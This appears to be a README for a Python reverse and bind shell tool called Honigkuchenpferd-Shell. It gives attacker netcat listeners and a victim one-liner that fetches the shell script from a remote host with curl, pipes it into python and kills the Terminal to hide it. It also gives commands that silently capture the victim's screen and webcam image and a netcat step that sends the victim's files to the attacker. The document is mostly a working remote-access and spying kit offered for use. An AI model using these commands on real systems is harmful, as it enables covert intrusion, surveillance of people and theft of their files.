![Screenshot](picture/hacking-is-bad-mmmkay.jpg)

# Honigkuchenpferd-Shell

free to use but doesn't mess up mmmkay !

Simple Reverse and Bind Shell

python2.7 and python3

## Server
```
#reverse shell
nc -lvp 6666

#bind shell
nc <IP> 6666
```

## Victim
```
curl -s http://$IP:$PORT/Honigkuchenpferd.py | /usr/bin/python  & disown; killall Terminal
```

## macOS:
### Screenshot
```
screencapture -x /tmp/screenshot.jpg
```
## ffmpeg:
### Screenshot
```
ffmpeg -f x11grab -framerate 1 -i :0.0 -vframes 1 screenshot.jpg
```
### Selfie
```
#Selfie
ffmpeg -f video4linux2 -s 640x480 -i /dev/video0 -ss 0:0:1 -frames 1 /tmp/selfie.jpg
```

## download File
Attacker:
```
#reverse shell
nc -lvp 6667 > sus_text.txt

#bind shell
nc <IP> 6667 > sus_text.txt
```
Victim:
```
[Honigkuchenpferd /home/Doofy/Dokumente/sus_stuff] download sus_text.txt
```
